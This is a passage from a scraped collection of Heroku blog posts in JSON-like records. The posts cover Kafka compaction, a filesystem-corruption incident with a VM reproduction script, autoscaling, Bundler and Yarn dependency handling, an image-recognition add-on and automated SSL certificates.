tombstoning or deleting messages in the topic with superseded keys, or by applying a time-based retention window. This tombstoning of repeated keys provides you with a sort of eventual consistency, with the implication that duplicate messages or keys may be present before the cleaning or compaction process has completed. While this doesn't give you real infinite storage -- you now have to care about what keys you assign and how big the space of keys grows -- it's a useful primitive for many systems. At Heroku we use compacted topics pretty sparingly. They're a much more special purpose tool than regular Kafka topics. The largest user is the team who work on Heroku's Metrics feature, where they power Threshold Alerts . Heroku Connect is also starting to use them. Even when end users aren’t taking advantage of compacted topics, Kafka makes extensive use of them internally: they provide the persistence and tracking of which offsets consumers and consumer groups have processed. This makes them an essential part of the codebase, so the reliability of compacted topics matters a lot. How Do Compacted Topics Really Work? Given the goal of \"removing duplicate keys\", how does Kafka go about implementing this? There are a few important elements. First is that, on disk, Kafka breaks messages up into \"segments\", which are plain files: my_topic_my_partition_1: [ a:1, b:2, c:3]\nmy_topic_my_partition_4: [ a:4, b:5] This notation uses key:offset to represent a message, as these are the primary attributes being manipulated for this task. Compaction doesn't care about message values, except that the most recent value for each key is preserved. Secondly, a periodic process --  the log cleaner thread -- comes along and removes messages with duplicate keys. It does this by deleting duplicates only for new messages that have arrived since the last compaction. This leads to a nice tradeoff where Kafka only requires a relatively small amount of memory to remove duplicates from a large amount of data. The cleaner runs in two phases. In phase 1, it builds an \"offset map\", from keys to the latest offset for that key. This offset map is only built for \"new\" messages - the log cleaner marks where it got to when it finished. In phase 2, it starts from the beginning of the log, and rewrites one segment at a time, removing any message which has a lower offset than the message with that key in the offset map. Phase 1 Data: my_topic_my_partition_1: [ a:1, b:2, c:3]\nmy_topic_my_partition_4: [ a:4, b:5 ] Offset map produced: {\n    a:4\n    b:5\n    c:3\n} Phase 2 my_topic_my_partition_1: [ a:1, b:2, c:3]\nmy_topic_my_partition_4: [ a:4, b:5 ] Breaking this cleaning down message-by-message: For the first message, a:1 , Kafka looks in the offset map, finds a:4 , so it doesn't keep this message. For the second message, b:2 , Kafka looks in the offset map, finds b:5 , so it doesn't keep this message. For the third message, c:3 , Kafka looks in the offset map, and finds no newer message, so it keeps this message. That's the end of the first segment, so the output is: my_topic_my_partition_1: [ c:3 ] Then we clean the second segment: For the first message in the second segment, a:4 , Kafka looks in the offset map, finds a:4 and so it keeps this message For the second message in the second segment, b:5 , Kafka looks in the offset map, finds b:5 and so it keeps this message That's the end of this segment, so the output is: my_topic_my_partition_4: [ a:4, b:5 ] So now, we've cleaned up to the end of the topic. We've elided a few details here, for example, Kafka has a relatively complex protocol that enables rewriting whole topics in a crash safe way. Secondly, Kafka doesn't ever build an offset map for the latest segment in the log. This is just to prevent doing the same work over and over - the latest log segment sees a lot of new messages, so there's no sense in continually recompacting using it. Lastly, there are some optimizations that mean small log segments get merged into larger files, which avoids littering the filesystem with lots of small files. The last part of the puzzle is that Kafka writes down the highest offset in the offset map, for any key, that it last built the offset map to. In this case, offset 5. Let's see what happens when we add some more messages (again ignoring the fact that Kafka never compacts using the last segment). In this case c:6 and a:7 are the new messages: my_topic_my_partition_1: [ c:3 ]\nmy_topic_my_partition_4: [ a:4, b:5 ]\nmy_topic_my_partition_6: [ c:6, a:7 ] Phase 1 Build the offset map: {\n  a: 7,\n  c: 6,\n} Note well, that the offset map doesn't include b:5 ! We already built the offset map (in the previous clean) up to that message, and our new offset map doesn't include a message with the key of b at all. This means the compaction process can use much less memory than you'd expect to remove duplicates. Phase 2 Clean the log: my_topic_my_partition_4: [ b:5 ]\nmy_topic_my_partition_6: [ c:6, a:7 ] What is the bug again? Prior to the most recent version of Kafka, the offset map had to keep a whole segment in memory. This simplified some internal accounting, but causes pretty gnarly problems, as it leads to the thread crashing if the map doesn't have enough space. The default settings have log segments grow up to 1GB of data, which at a very small message size can overwhelm the offset map with the sheer number of keys. Then, having run out of space in the offset map without fitting in a full segment, an assertion fires and the thread crashes. What makes this especially bad is Kafka's handling of the thread crashing: there's no notification to an operator, the process itself carries on running. This violates a good fundamental principle that if you're going to fail, fail loudly and publicly. With a broker running without this thread in the long term, data that is meant to be compacted grows and grows. This threatens the stability of the node, and if the crash impacts other nodes, the whole cluster. What is the fix? The fix was relatively simple, and a common theme in software: \"stop doing that bad thing\". After spending quite some time to understand the compaction behavior (as explained above), the code change was a simple 100 line patch . The fix means Kafka doesn't try to fit a whole segment in the offset map and lets it instead mark \"I got partway through a log segment when building the map\". The first step was to remove the assertion that caused the log cleaner thread to die . Then, we reworked the internal tracking such that we can record a partial segment load and recover from that point. The outcome now, is that the log cleaner thread doesn't die silently. This was a huge stress reliever for us - we've seen this happen in production multiple times, and recovering from it is quite tricky. Conclusion Working with the Kafka community on this bug was a great experience. We filed a Jira ticket and talked through potential solutions. After a short while, Jun Rao and Jay Kreps had a suggested solution, which was what we implemented. After some back and forth with code review, the patch was committed and made it into the latest release of Kafka. This fix is in Kafka 0.10.1.1, which is now available and the default version on Heroku. You can provision a new cluster like so: $ heroku addons:create heroku-kafka For existing customers, you can upgrade to this release of Kafka like so: $ heroku kafka:upgrade heroku-kafka --version 0.10 kafka bug fix", "date": "2017-01-11,"},
{"website": "Heroku", "title": "Announcing Heroku Autoscaling for Web Dynos ", "author": ["Michelle Peot"], "link": "https://blog.heroku.com/heroku-autoscaling", "abstract": "Announcing Heroku Autoscaling for Web Dynos Posted by Michelle Peot January 24, 2017 Listen to this article We’re excited to announce that Heroku Autoscaling is now generally available for apps using web dynos. We’ve always made it seamless and simple to scale apps on Heroku - just move the slider.  But we want to go further, and help you in the face of unexpected demand spikes or intermittent activity.  Part of our core mission is delivering a first-class operational experience that provides proactive notifications, guidance, and—where appropriate—automated responses to particular application events. Today we take another big step forward in that mission with the introduction of Autoscaling. Autoscaling makes it effortless to meet demand by horizontally scaling your web dynos based on what’s most important to your end users: responsiveness.  To measure responsiveness, Heroku Autoscaling uses your app’s 95th percentile (p95) response time, an industry-standard metric for assessing user experience.  The p95 response time is the number of milliseconds that only 5% of your app’s response times exceed.  You can view your app’s p95 response time in the Application Metrics response time plot . Using p95 response time as the trigger for autoscaling ensures that the vast majority of your users experience good performance, without overreacting to performance outliers. Autoscaling is easy to set up and use, and it recommends a p95 threshold based on your app’s past 24 hours of response times. Response-based autoscaling ensures that your web dyno formation is always sized for optimal efficiency, while capping your costs based on limits you set. Autoscaling is currently included at no additional cost for apps using Performance and Private web dynos. Get Started From Heroku Dashboard navigate to the Resources tab to enable autoscaling for your web dynos: From the web dyno formation dialog set the desired upper and lower limit for your dyno range. With Heroku Autoscaling you won’t be surprised by unexpected dyno fees. The cost estimator shows the maximum possible web dyno cost when for using autoscaling, expressed in either dyno units for Heroku Enterprise organizations, or dollars. Next, enter the desired p95 response time in milliseconds. To make it easy to select a meaningful p95 setting, the median p95 latency for the past 24 hours is provided as guidance.  By enabling Email Notifications we’ll let you know if the scaling demand reaches your maximum dyno setting, so you won’t miss a customer request. Monitoring Autoscaling You can monitor your autoscaling configuration and scaling events the Events table on Application Metrics and view the corresponding impact on application health. When to Use Autoscaling Autoscaling is useful for when demand on web resources is variable. However, it is not meant to be a panacea for all application health issues that result in latency. For example, it is possible that lengthy response times may be due to a downstream resource, such as a slow database query.  In this case scaling web dynos in the absence of sufficient database resources or query optimization could result in exacerbation of the problem. In order to identify whether autoscaling is appropriate for your environment we recommend that you load test prior to implementing autoscaling in production, and use Threshold Alerting to monitor your p95 response times and error rates. If you plan to load test please refer to our Load Testing Guidelines for Support notification requirements. As with manual scaling, you may need to tune your downstream components in anticipation of higher request volumes.  Additional guidance on optimization is available in the Scaling documentation . How it Works Heroku's autoscaling model employs Little's Law to determine the optimal number of web dynos needed to maintain your current request throughput while keeping web request latency within your specified p95 response time threshold.  The deficit or excess of dynos is measured as Ldiff, which takes into consideration the past hour of traffic. For example in the following simulation, at time point 80 minutes there is a spike in response time (latency) and a corresponding dip in Ldiff, indicating that there is a deficit in the existing number of web dynos with respect to the current throughput and response time target.  The platform will add an additional web dyno and reassess the Ldiff.  This process will be repeated until the p95 response time is within your specified limit or you have reached your specified upper dyno limit.  A similar approach is used for scaling in. Find Out More Autoscaling has been one of your top requested features when it comes to operational experience - thank you to everyone who gave us feedback during the beta and in our recent ops survey. For more details on autoscaling refer to the Dyno Scaling documentation.  Learn more about Heroku's other operational features here . If there’s an autoscaling enhancement or metrics-driven feature you would like to see, you can reach us at metrics-feedback@heroku.com .", "date": "2017-01-24,"},
{"website": "Heroku", "title": "Announcing the Sydney, Australia Region for Heroku Private Spaces", "author": ["Tim Lang"], "link": "https://blog.heroku.com/private-spaces-sydney-region", "abstract": "Announcing the Sydney, Australia Region for Heroku Private Spaces Posted by Tim Lang January 30, 2017 Listen to this article Today we’re happy to announce that the Sydney, Australia region is now generally available for use with Heroku Private Spaces . Sydney joins Virginia, Oregon, Frankfurt, and Tokyo as regions where Private Spaces can be created by any Heroku Enterprise user. Developers can now deploy Heroku apps closer to customers in the Asia-Pacific area to reduce latency and take advantage of the advanced network & trust controls of Spaces to ensure sensitive data stays protected. Usage To create a Private Space in Sydney, select the Spaces tab in Heroku Dashboard in Heroku Enterprise, then click the “New Space” button and choose “Sydney, Australia” from the the Space Region dropdown. After a Private Space in Sydney is created, Heroku apps can be created inside it as normal . Heroku Postgres , Redis , and Kafka are also available in Sydney as are a variety of third-party Add-ons . Better Latency for Asia-Pacific Prior to this release, a Heroku Enterprise developer, from anywhere in the world, could create apps in Spaces in Virginia, Oregon, Tokyo, or Frankfurt, and have them be available to any user in the world. The difference with this release is that apps (and Heroku data services) can be created and hosted in the Sydney region. This will bring far faster access for developers and users of Heroku apps across the Asia-Pacific area. Time-To-First-Byte for a user in Australia accessing an app deployed in a Private Space in the Sydney region is approximately four times better than for that same user accessing an app deployed in a Private Space in Tokyo (approx 0.1s vs 0.4s). Extending the Vision of Heroku Private Spaces A Private Space , available as part of Heroku Enterprise , is a network isolated group of apps and data services with a dedicated runtime environment, provisioned to Heroku in a geographic region you specify. With Spaces you can build modern apps with the powerful Heroku developer experience and get enterprise-grade secure network topologies. This enables your Heroku applications to securely connect to on-premise systems on your corporate network and other cloud services, including Salesforce. With the GA of the Sydney Region, we now bring those isolation, security, and network benefits to Heroku apps and data services in the Asia-Pacific region. Learn More All Heroku Enterprise customers can immediately begin to create Private Spaces in Sydney and deploy apps there. We’re excited by the possibilities Private Spaces opens up for developers in Australia and Asia-Pacific more broadly - if you want more information, or are an existing Heroku customer and have questions on using and configuring Spaces, please contact us . Private Spaces Heroku Enterprise Sydney Australia", "date": "2017-01-30,"},
{"website": "Heroku", "title": "How We Found and Fixed a Filesystem Corruption Bug", "author": ["Owen Jacobson"], "link": "https://blog.heroku.com/filesystem-corruption-on-heroku-dynos", "abstract": "How We Found and Fixed a Filesystem Corruption Bug Posted by Owen Jacobson February 15, 2017 Listen to this article As part of our commitment to security and support, we periodically upgrade the stack image, so that we can install updated package versions, address security vulnerabilities, and add new packages to the stack. Recently we had an incident during which some applications running on the Cedar-14 stack image experienced higher than normal rates of segmentation faults and other “hard” crashes for about five hours . Our engineers tracked down the cause of the error to corrupted dyno filesystems caused by a failed stack upgrade. The sequence of events leading up to this failure, and the technical details of the failure, are unique, and worth exploring. Background Heroku runs application processes in dynos , which are lightweight Linux containers, each with its own, isolated filesystem. Our runtime system composes the container’s filesystem from a number of mount points. Two of these mount points are particularly critical: the /app mount point, which contains a read-write copy of the application , and the / mount point, which contains the container’s stack image, a prepared filesystem with a complete Ubuntu installation. The stack image provides applications running on Heroku dynos with a familiar Linux environment and a predictable list of native packages . Critically, the stack image is mounted read-only, so that we can safely reuse it for every dyno running on the same stack on the same host. Given the large number of customer dynos we host, the stack upgrade process is almost entirely automated, and it’s designed so that a new stack image can be deployed without interfering with running dynos so that our users aren’t exposed to downtime on our behalf. We perform this live upgrade by downloading a disk image of the stack to each dyno host and then reconfiguring each host so that newly-started dynos will use the new image. We write the newly-downloaded image directly to the data directory our runtime tools use to find images to mount, so that we have safety checks in the deployment process, based on checksum files, to automatically and safely skip the download if the image is already present on the host. Root Causes Near the start of December, we upgraded our container tools. This included changing the digest algorithms and filenames used by these safety checks. We also introduced a latent bug: the new version of our container tools didn't consider the checksum files produced by previous versions. They would happily install any disk image, even one that was already present, as long as the image had not yet been installed under the new tools. We don’t often re-deploy an existing version of a stack image, so this defect might have gone unnoticed and would eventually have become irrelevant. We rotate hosts out of our runtime fleet and replace them with fresh hosts constantly, and the initial setup of a fresh host downloads the stack image using the same tools we use to roll out upgrades, which would have protected those hosts from the defect. Unfortunately, this defect coincided with a second, unrelated problem. Several days after the container tools upgrade, one of our engineers attempted to roll out an upgrade to the stack image . Issues during this upgrade meant that we had to abort the upgrade, and our standard procedure to ensure that all container hosts are running the same version when we abort an upgrade involves redeploying the original version of the container. During redeployment, the safety check preventing our tools from overwriting existing images failed, and our container tools truncated and overwrote the disk image file while it was still mounted in running dynos as the / filesystem. Technical Impact The Linux kernel expects that a given volume, whether it’s backed by a disk or a file, will go through the filesystem abstraction whenever the volume is mounted. Reads and writes that go through the filesystem are cached for future accesses, and the kernel enforces consistency guarantees like “creating a file is an atomic operation” through those APIs. Writing directly to the volume bypasses all of these mechanisms, completely, and (in true Unix fashion) the kernel is more than happy to let you do it. During the incident, the most relevant consequence for Heroku apps involved the filesystem cache: by truncating the disk image, we’d accidentally ensured that reads from the image would return no data, while reads through the filesystem cache would return the data from the previously-present filesystem image. There’s very little predictability to which pages will be in the filesystem cache, so the most common effect on applications was that newly-loaded programs would partially load from the cache and partially load from the underlying disk image, mid-download. The resulting corrupted programs crashed, often with a segmentation fault, the first time they executed an instruction that attempted to read any of the missing data, or the first time they executed an instruction that had, itself, been damaged. During the incident, our response lead put together a small example to verify the effects we’re seeing. If you have a virtual machine handy, you can reproduce the problem yourself, without all of our container infrastructure. (Unfortunately, a Docker container won’t cut it: you need something that can create new mount points.) Create a disk image with a simple program on it. We used sleep . dd if=/dev/zero of=demo.img bs=1024 count=10240\nmkfs -F -t ext4 demo.img\nsudo mkdir -p /mnt/demo\nsudo mount -o loop demo.img /mnt/demo\nsudo cp -a /bin/sleep /mnt/demo/sleep\nsudo umount /mnt/demo Make a copy of the image, which we’ll use later to simulate downloading the image: cp -a demo.img backup.img Mount the original image, as a read-only filesystem: sudo mount -o loop,ro demo.img /mnt/demo In one terminal, start running the test program in a loop: while /mnt/demo/sleep 1; do\n    :\ndone In a second terminal, replace the disk image out from underneath the program by truncating and rewriting it from the backup copy: while cat backup.img > demo.img; do\n    # flush filesystem caches so that pages are re-read\n    echo 3 | sudo tee /proc/sys/vm/drop_caches > /dev/null\ndone Reliably, sleep will crash, with Segmentation fault (core dumped) . This is exactly the error that affected customer applications. This problem caught us completely by surprise. While we had taken into account that overwriting a mounted image would cause problems, none of us fully understood what those problems would be. While both our monitoring systems and our internal userbase alerted us to the problem quickly, neither was able to offer much insight into the root cause. Application crashes are part of the normal state of our platform, and while an increase in crashes is a warning sign we take seriously, it doesn’t correlate with any specific causes. We were also hampered by our belief that our deployment process for stack image upgrades was designed not to modify existing filesystem images. The Fix Once we identified the problem, we migrated all affected dynos to fresh hosts, with non-corrupted filesystems and with coherent filesystem caches. This work took the majority of the five hours during which the incident was open. In response to this incident, we now mark filesystem images as read-only on the host filesystem once they’re installed. We’ve re-tested this, under the conditions that lead to the original incident, and we’re confident that this will prevent this and any overwriting-related problems in the future. We care deeply about managing security, platform maintenance and other container orchestration tasks, so that your apps \"just work\" - and we're confident that these changes make our stack management even more robust. security bug fix", "date": "2017-02-15,"},
{"website": "Heroku", "title": "Bundler Changed Where Your Canonical Ruby Information Lives: What You Need to Know", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/bundler-and-canonical-ruby-version", "abstract": "Bundler Changed Where Your Canonical Ruby Information Lives: What You Need to Know Posted by Richard Schneeman February 28, 2017 Listen to this article Heroku bumped its Bundler version to 1.13.7 almost a month ago, and since then we've had a large number of support tickets opened, many a variant of the following: Your Ruby version is <X>, but your Gemfile specified <Y> I wanted to talk about why you might get this error while deploying to Heroku, and what you can do about it, along with some bonus features provided by the new Bundler version. Why? First off, why are you getting this error? On Heroku in our Ruby Version docs , we mention that you can use a Ruby directive in your Gemfile to specify a version of Ruby. For example if you wanted 2.3.3 then you would need this: # Gemfile\n\nruby \"2.3.3\" This is still the right way to specify a version, however recent versions of Bundler introduced a cool new feature. To understand why this bug happens you need to understand how the feature works. Ruby Version Specifiers If you have people on your team who want to use a more recent version of Ruby, for example say Ruby 2.4.0 locally, but you don't want to force everyone to use that version you can use a Ruby version operator. # Gemfile\n\nruby \"~> 2.3\" I don't recommend you do this since \"2.3\" isn't a technically valid version of Ruby. I recommend using full Ruby versions in the version specifier; so if you don't have a Ruby version in your Gemfile.lock bundle platform --ruby will still return a valid Ruby version. You can use multiple version declarations just like in a gem for example: ruby '>= 2.3.3', '< 2.5' . This says that any version of Ruby up until 3.0 is valid. This feature came in Bundler 1.12 but wasn't made available on Heroku until Bundler 1.13.7. In addition to the ability to specify a Ruby version specifier, Bundler also introduced locking the actual Ruby version in the Gemfile.lock : # Gemfile.lock\n\nRUBY VERSION\n   ruby 2.3.3p222 When you run the command: $ bundle platform --ruby\nruby 2.3.3p222 You'll get the value from your Gemfile.lock rather than the version specifier from your Gemfile . This is to provide you with development/production parity. To get that Ruby version in your Gemfile.lock you have to run bundle install with the same version of Ruby locally, which means when you deploy you'll be using a version of Ruby you use locally. Did you know this is actually how Heroku gets your Ruby version? We run the bundle platform --ruby command against your app. So while the version specifier tells bundler what version ranges are \"valid\" the version in the Gemfile.lock is considered to be canonical. An Error By Any Other Name So if you were using the app before with the specifier ruby \"~> 2.3\" and you try to run it with Ruby 1.9.3 you'll get an error: Your Ruby version is 1.9.3, but your Gemfile specified ~> 2.3 This is the primary intent of the bundler feature, to prevent you from accidentally using a version of Ruby that may or may not be valid with the app. However if Heroku gets the Ruby version from bundle platform --ruby and that comes from the Gemfile and Gemfile.lock , how could you ever be running a version of Ruby on Heroku different from the version specified in your Gemfile ? One of the reasons we didn't support Bundler 1.12 was due to a bug that allowed incompatible Gemfile and Gemfile.lock Ruby versions . I reported the issue, and the bundler team did an amazing job patching it and releasing the fix in 1.13. What I didn't consider after is that people might still be using older bundler versions locally. So what is happening is that people will update the Ruby version specified in their Gemfile without running bundle install so their Gemfile.lock does not get updated. Then they push to Heroku and it breaks. Or they're using an older version of Bundler and their Gemfile.lock is using an incompatible version of Ruby locally but isn't raising any errors. Then they push to Heroku and it breaks. So if you're getting this error on Heroku, run this command locally to make sure your Bundler is up to date: $ gem install bundler\nSuccessfully installed bundler-1.13.7\n1 gem installed\nInstalling ri documentation for bundler-1.13.7...\nInstalling RDoc documentation for bundler-1.13.7... Even if you haven't hit this bug yet, go ahead and make sure you're on a recent version of Bundler right now. Once you've done that run: $ bundle install If you've already got a Ruby version in your Gemfile.lock you'll need to run $ bundle update --ruby This will insert the same version of Ruby you are using locally into your Gemfile.lock . If you get the exception locally Your Ruby version is <X>, but your Gemfile specified <Y> it means you either need to update your Gemfile to point at your version of Ruby, or update your locally installed version of Ruby to match your Gemfile . Once you've got everything working, make sure you commit it to git $ git add Gemfile.lock\n$ git commit -m \"Fix Ruby version\" Now you're ready to git push heroku master and things should work. When Things Go Wrong When these type of unexpected problems creep up on customers we try to do as much as we can to make the process easy for customers to understand the problem, and the fix. After seeing a few tickets come in, the information was shared internally with our support department (they're great by the way). Recently I added documentation to Dev Center to document this explicit problem. I've also added some checks in the buildpack to give users a warning that points them to the docs . This is the best case scenario where not only can we document the problem, and the fix, but also add docs directly to the buildpack so you get it when you need it. I also wanted to blog about it to help people wrap their minds around the fact that the Gemfile is no longer the canonical source of the exact Ruby version, but instead the Gemfile.lock is. While the Gemfile holds the Ruby version specifier that declares a range of ruby versions that are valid with your app, the Gemfile.lock holds the canonical Ruby version of your app. As Ruby developers we have one of the best (if not the best) dependency managers in bundler. I'm excited for more people to start using version specifiers if the need arises for their app and I'm excited to support this feature on Heroku.", "date": "2017-02-28,"},
{"website": "Heroku", "title": "Yarn: Lock It in for Deterministic Dependency Resolution", "author": ["Chris Castle"], "link": "https://blog.heroku.com/yarn-deterministic-dependency-resolution", "abstract": "Yarn: Lock It in for Deterministic Dependency Resolution Posted by Chris Castle March 02, 2017 Listen to this article Choices are an important part of a healthy open source software community.  That’s why we’re excited about Yarn, a new package manager that addresses many of the problems with Node’s default package manager, npm .  While npm has done a fantastic job creating a large and vibrant JavaScript ecosystem, I want to share why Yarn is an important addition to the Node.js ecosystem, how it will improve your Node.js development experience, and how Heroku has incorporated it into the build process for your Heroku apps. We began testing Yarn almost immediately after it was released, and began fully supporting it on December 16. About Yarn Yarn was released in October 2016 and made a big splash immediately.  And while it came out of Facebook, Yarn is a true open source project: it has a BSD license , clear contribution guidelines and code of conduct .  Big changes to Yarn are managed through a public RFC process . A few popular projects have switched to Yarn.  Ruby on Rails in version 5.1 switched to using Yarn by default .  JHipster, a Java web app generator that incorporates Spring Boot, Angular, and Yeoman, has switched to Yarn too. Why All The Excitement? Yarn improves several aspects of dependency management for Node developers.  It pulls packages from the npm registry (via a proxy ), which gives you access to the same huge selection of packages available via npm.  But Yarn gives you three big benefits: Predictable installs Security as a core value Performance Let’s look at each in more detail. Predictable Installs Adding a new dependency to a Node project can sometimes be a torturous task.  It has become far too common for Node developers to resort to rm -rf node_modules && npm install after encountering errors adding a new dependency to a project. You can kiss those days goodbye with Yarn.  An explicit design goal of Yarn is deterministic dependency resolution. What is deterministic dependency resolution?  Think of a pure function .  If the same inputs go into a pure function, the same outputs always come out. Dependency resolution should work the same way. If the same dependency list goes in, the same node_modules folder should come out. Why is This Important? We want to make every deploy on Heroku a low risk event.  It should be a fast and common part of your everyday development workflow.  We also want to encourage dev / prod parity—the code that runs in your development environment should be exactly what runs in production. Running npm install on two different machines can result in different dependencies being installed on each machine.  These two machines could be two developer machines.  Or, much more problematic, they could be a development machine and a production machine.  The crux of this is that the dependency tree npm generates is determined by the order in which packages are installed. For more detail on this, I suggest you read this page from npm’s documentation . How Does Yarn Address This? Yarn’s lockfile is the key component making its dependency resolution deterministic.  Using the lockfile, Yarn will generate the same dependency tree regardless of install order.  This means it’s important that you commit your yarn.lock file to source control. Security as a Core Value Why Is This Important? How do you know every time you or your deploy process runs npm install you’re getting the same code you got the first time?  With npm, you don’t.  For example, you might have a faulty cache or there might be an issue with the proxy you’re using.  npm will install that different code and not provide a warning or error. How Does Yarn Address This? Yarn inspects the integrity of each package every time it is installed.  It calculates a checksum to ensure you always get the same bits for a specified version of a package.  If one line of code changes in left-pad v1.1.2, Yarn’s next install of left-pad will fail. Performance For most Node projects, Yarn will download and install dependencies faster than npm.  Note that I said most projects, not all projects.  You can see Yarn’s own measurements here , or you can check out the various 3rd party comparisons or do some tests yourself . Why Does This Matter? While build predictability and security are most important to us, fast dependency installation provides some great benefits.  We want your deploys on Heroku to be fast -- regardless of whether you’re deploying a Review App , staging app, or production app.  But even on your local development machine, Yarn will get you faster initial project setup and faster addition or upgrade of dependencies.  It means you can more easily stay undistracted in your flow state . How Does Yarn Address This? Whereas npm downloads dependencies sequentially, Yarn downloads, compiles if necessary, and installs multiple dependencies in parallel.  Most computers and network connections these days are capable of installing more than one dependency at a time. Bonus Round So are you excited about Yarn yet?  If not, here are a few more Yarn features that have been useful to me: yarn why left-pad Identifies why the left-pad package is installed, showing which other packages depend upon it. yarn licenses generate-disclaimer generates a license disclaimer from installed dependencies. yarn upgrade-interactive interactively upgrades specific dependencies. Yarn + Heroku Heroku has full support for Yarn .  Any Node.js app with a yarn.lock file will be built using Yarn instead of npm.  Without any additional work, using Yarn on Heroku will get you predictable, secure, and, possibly, faster deploys.  Of course, if you want or need to continue using npm, you can. If you haven’t used Yarn yet, I encourage you to check out the getting started guide .  It took me just a few minutes to swap out npm for Yarn on several existing projects, and just a few more minutes to figure out Yarn’s simple commands . yarn npm node dependency resolution build", "date": "2017-03-02,"},
{"website": "Heroku", "title": "Introducing the Einstein Vision Add-on for Image Recognition", "author": ["Mars Hall"], "link": "https://blog.heroku.com/einstein-vision-image-recognition", "abstract": "Introducing the Einstein Vision Add-on for Image Recognition Posted by Mars Hall March 07, 2017 Listen to this article The most innovative apps augment our human senses, intuition, and logic with machine learning. Deep learning , modelled after the neural networks of the human brain, continues to grow as one of the most powerful types of machine learning. When applied to images, deep learning enables powerful computer vision features like visual search, product identification, and brand detection. Today, we bring you the Einstein Vision add-on (beta) , allowing Heroku developers to easily connect to and use Einstein Vision , a set of powerful new APIs for building AI-powered apps. With this release, Salesforce is making it easy for you to embed image recognition directly into your apps. Rather than building and managing the specialized infrastructure needed to host deep learning models, simply connect to Einstein Vision's HTTP/REST API for custom image recognition with little development overhead. Use Einstein Vision to discover your products across your social media channels, analyze observational data in healthcare and life science applications, and enable visual search in eCommerce apps to delight your customers. Get started quickly with pre-trained image classifiers that are automatically available to you when you install the Einstein Vision add-on. A Simple Workflow for Custom Image Recognition The true strength of Einstein Vision is its ability to train custom models to recognize the things you care about. Creating a custom model takes just a few steps: Plan Collect Train & Evaluate Query Let's walk through the workflow to create a brand recognizer for Heroku logos and artwork , which is based on the Einstein Vision example app in Node.js . Plan the Model: Label All the Things In machine learning, the “model” is the brain that answers questions, and “labels” are the possible answers. To have Einstein Vision recognize specific objects, we will train the model using example images for each label. For the example brand recognizer app , labels represent visual aspects of the Heroku brand. Start with the labels of primary interest: Heroku logo , isolated logos Heroku artwork , various supporting imagery Heroku swag , t-shirts, socks, water bottles, etc. Then, think about images that do not contain one of the objects we want to recognize. How will the model answer those questions? Let's plan a negative, catch-all label representing the infinite world of objects beyond our target labels: Unknown , a random set of things we don't care about The unknown set is a curiosity at first. Remember that the model can only answer questions it's been trained to answer. If you want a clear indication of the model not matching a label, then train negative labels as well. Collect Example Images Before diving into the actual machine learning, we must gather example images that represent each of the planned labels. Each label needs a variety of example images: in isolation, in normal surroundings, from various angles, with various compositions, and with 2D & 3D representations. This avoids over-fitting the model, improving the flexibility in classification of unseen images. We collect examples by sorting them into a directory named for each label, preparing them for zip upload into a dataset . While a model can be trained with very few images per label, more training examples will dramatically improve prediction accuracy for unseen images. We've built demos with just a few dozen examples per label, but at least a thousand images per label is recommended for high-confidence predictions. Train The Model Once the example images are collected, we will use the REST/HTTP API provided by the add-on to upload the dataset. The steps to train a model are: Upload example images Initiate training Check training status Inspect the model's metrics Walkthrough the API flow with our example. Performance Evaluation After training, Einstein Vision automatically evaluates the model using cross-validation. It withholds a random 10% ( k-fold = 10) of the example data to test the model. The accuracy of predictions from that portion of unseen data, the testAccuracy , represents how the model will perform in the real-world. Fetch model metrics from the API for any trained model to get its testAccuracy . Additional metrics returned may indicate issues with examples confusing the algorithm or errors reducing the useful dataset. To tune a model, revise the source dataset to address any issues and then create, train, and evaluate a new model. After tuning, the model with superior metrics may be considered production-ready. Query The Model Once training is complete, the new model will answer queries to classify images by URL reference or direct upload. Here's an example query using the curl command-line tool: $ curl -X POST \\\n  -F \"sampleContent=@./path/to/image.jpg\" \\\n  -F \"modelId=YYYYY\" \\\n  -H \"Authorization: Bearer XXXXX\" \\\n  -H \"Content-Type: multipart/form-data\" \\\n  https://api.metamind.io/v1/vision/predict Example JSON response: {\n  \"probabilities\": [\n    {\n      \"label\": \"Heroku Artwork\",\n      \"probability\": 0.53223926\n    },\n    {\n      \"label\": \"unknown\",\n      \"probability\": 0.46305126\n    },\n    {\n      \"label\": \"Heroku Swag\",\n      \"probability\": 0.0038324401\n    },\n    {\n      \"label\": \"Heroku Logo\",\n      \"probability\": 0.0008770062\n    }\n  ],\n  \"object\": \"predictresponse\"\n} Pipeline to Production One of the wonderful things about Heroku apps is that after you get a proof-of-concept running, add the app to a Pipeline to enable enterprise-grade continuous delivery, including: Review Apps , CI Tests (in private beta), and elegant promotion to production. To share a model created in one app with other apps in a Heroku Pipeline, such as promoting an app from Review App to Staging and finally to Production, the add-on must be shared between those apps . Only the Beginning We can’t wait to see what you build with the Einstein Vision add-on (beta) . Einstein Vision is free to get started, and we plan to introduce paid plans at GA in a few weeks. Check out the add-on documentation , then dive in with our Node example app or add it to your own app to try it out.", "date": "2017-03-07,"},
{"website": "Heroku", "title": "Announcing Free and Automated SSL Certs For All Paid Dynos", "author": ["Brett Goulder"], "link": "https://blog.heroku.com/announcing-automated-certificate-management", "abstract": "Announcing Free and Automated SSL Certs For All Paid Dynos Posted by Brett Goulder March 21, 2017 Listen to this article We are happy to announce the general availability of Automated Certificate Management (ACM) for all paid Heroku dynos.  With ACM, the cumbersome and costly process of provisioning and managing SSL certificates is replaced with a simple experience that is free for all paid Dynos on Heroku’s Common Runtime .   Creating secure web applications has never been more important, and with ACM and the Let’s Encrypt project, never easier. ACM handles all aspects of SSL/TLS certificates for custom domains; you no longer have to purchase certificates, or worry about their expiration or renewal.   ACM builds directly on our recent release of Heroku Free SSL to make encryption the default for web applications and helps you protect against eavesdropping, cookie theft, and content hijacking.  Heroku has always made it easy to add SSL encryption to web applications — today’s release of ACM extends that further to automatically generate a TLS certificate issued by Let’s Encrypt for your application’s custom domains. How It Works New Applications Every time you upgrade from a Free dyno to a Hobby or Professional dyno, we will automatically generate a TLS certificate for all custom domains on your application. You will need to ensure that your application’s custom domains are pointed to the correct DNS targets as specified in heroku domains . Existing Applications For existing applications, you can enable ACM by simply going to your application’s settings page and clicking the “Configure SSL” button. Or you can run the CLI command: $ heroku certs:auto:enable -a <app name> If your application was not using Heroku SSL, update your DNS settings for your custom domain to its new DNS target and run heroku domains to verify. Run the following to verify whether your application’s domains are covered by Automated Certificate Management: $ heroku certs:auto For more details, including how to migrate from the SSL endpoint add-on, please see our Dev Center documentation . tls ssl lets-encrypt automated-certificate-management", "date": "2017-03-21,"},
